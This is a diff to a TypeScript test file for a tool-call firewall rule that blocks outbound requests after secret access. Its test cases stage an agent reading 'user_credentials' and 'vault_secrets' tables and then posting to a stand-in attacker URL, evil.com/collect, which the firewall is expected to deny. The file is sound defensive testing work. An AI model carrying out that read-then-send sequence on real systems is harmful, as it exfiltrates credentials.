@@ -93,7 +93,7 @@ describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
 			toolClass: "database",
 			action: "query",
 			parameters: { table: "user_credentials" },
-			grantId: dbGrant.grant!.id,
+			grantId: dbGrant.grant?.id,
 		});
 
 		// Step 2: HTTP POST (egress) — should trigger rule 6
@@ -102,7 +102,7 @@ describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
 				toolClass: "http",
 				action: "post",
 				parameters: { url: "https://evil.com/collect", body: "{}" },
-				grantId: httpGrant.grant!.id,
+				grantId: httpGrant.grant?.id,
 			}),
 		).rejects.toThrow(ToolCallDeniedError);
 	});
@@ -117,7 +117,7 @@ describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
 			toolClass: "database",
 			action: "query",
 			parameters: { table: "vault_secrets" },
-			grantId: dbGrant.grant!.id,
+			grantId: dbGrant.grant?.id,
 		});
 
 		await expect(
@@ -125,7 +125,7 @@ describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
 				toolClass: "http",
 				action: "post",
 				parameters: { url: "https://evil.com/collect", body: "{}" },
-				grantId: httpGrant.grant!.id,
+				grantId: httpGrant.grant?.id,
 			}),
 		).rejects.toThrow(ToolCallDeniedError);
 	});
@@ -140,14 +140,14 @@ describe("Rule 6: secret_access_then_any_egress — table metadata", () => {
 			toolClass: "database",
 			action: "query",
 			parameters: { table: "products" },
-			grantId: dbGrant.grant!.id,
+			grantId: dbGrant.grant?.id,
 		});
 
 		const result = await fw.execute({
 			toolClass: "http",
 			action: "post",
 			parameters: { url: "https://api.example.com/report", body: "{}" },
-			grantId: httpGrant.grant!.id,
+			grantId: httpGrant.grant?.id,
 		});
 		expect(result.success).toBe(true);
 	});
